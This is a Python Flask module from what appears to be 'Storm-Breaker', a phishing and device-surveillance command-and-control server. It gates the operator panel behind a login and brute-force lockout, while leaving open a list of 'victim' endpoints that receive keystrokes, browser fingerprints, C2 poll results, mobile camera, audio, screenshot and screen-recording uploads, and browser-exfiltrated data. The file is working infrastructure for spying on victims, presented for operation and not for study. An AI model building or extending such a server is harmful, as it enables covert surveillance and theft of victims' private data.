"""Storm-Breaker legacy shim — post P3.23.

Every route now lives in ``app/blueprints/*`` (registered by
``app.create_app()``).  This module keeps only the process-global
request gates that operate on the assembled app (victim/public path
exemptions, operator auth gate, persisted login throttle) plus the
direct-run entry point.  Rollback for the P3.23 drain: checkout tag
``g4-ok``.
"""
from __future__ import annotations

import time as _time

from flask import jsonify, redirect, request, session

import database as db

# === Flask construction delegated to app.create_app() (HANDOFF §P2.4) ===
from app import create_app
from app.core import lockout as _lockout  # P7.3: persisted brute-force lockout

app = create_app()

# ===== GLOBAL AUTH GATE (fix for vuln dc999286: unauth read APIs on public URL) =====
_VICTIM_PUBLIC_PATHS = {
    '/login', '/login.php', '/logout', '/logout.php', '/index.php', '/favicon.ico',
    '/receiver', '/receiver.php',
    '/api/fingerprint', '/api/keystrokes',
    '/api/session/start', '/api/session/events', '/api/session/end',
    '/api/c2/register', '/api/c2/poll', '/api/c2/response',
    '/api/c2/file_list_response', '/api/c2/file_download_response',
    '/api/mobile/register', '/api/mobile/poll', '/api/mobile/response',
    '/api/mobile/camera', '/api/mobile/background_data',
    '/api/mobile/screenshot', '/api/mobile/audio', '/api/mobile/screen_record',
    '/api/browser-exfil/receive', '/api/network/receive',
    # P10.2: the desktop shell polls this cookie-less over loopback
    '/api/notify/pending',
}
_VICTIM_PUBLIC_PREFIXES = ('/t/', '/assets/', '/c/')

@app.before_request
def _auth_gate():
    path = request.path
    if path in _VICTIM_PUBLIC_PATHS:
        return None
    if any(path.startswith(p) for p in _VICTIM_PUBLIC_PREFIXES):
        return None
    if session.get('IAm-logined'):
        return None
    if path.startswith('/api/') or path.endswith('.php'):
        return jsonify({'error': 'Unauthorized'}), 401
    return redirect('/login')

# ===== login brute-force lockout (fix: public URL + default creds) =====
# P7.3: lockout state is persisted in the operator DB (login_lockouts
# table, applied by the additive migration) so it survives restarts.

@app.before_request
def _login_throttle():
    if request.path in ('/login', '/login.php') and request.method == 'POST':
        ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '?').split(',')[0].strip()
        rec = _lockout.get(ip)  # P7.3: persisted
        if rec and rec[1] > _time.time():
            return jsonify({'error': 'Too many failed attempts; locked 60s'}), 429

@app.after_request
def _login_throttle_track(resp):
    if request.path in ('/login', '/login.php') and request.method == 'POST':
        ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '?').split(',')[0].strip()
        if resp.status_code in (301, 302):
            _lockout.pop(ip)
        else:
            fails, until = _lockout.get(ip) or (0, 0)
            if until and until <= _time.time():
                fails = 0
            fails += 1
            _lockout.set(ip, fails, (_time.time() + 60) if fails >= 5 else 0)
    return resp


if __name__ == '__main__':
    # Initialize database
    db.init_database()
    app.run(host='0.0.0.0', port=2525, debug=False)
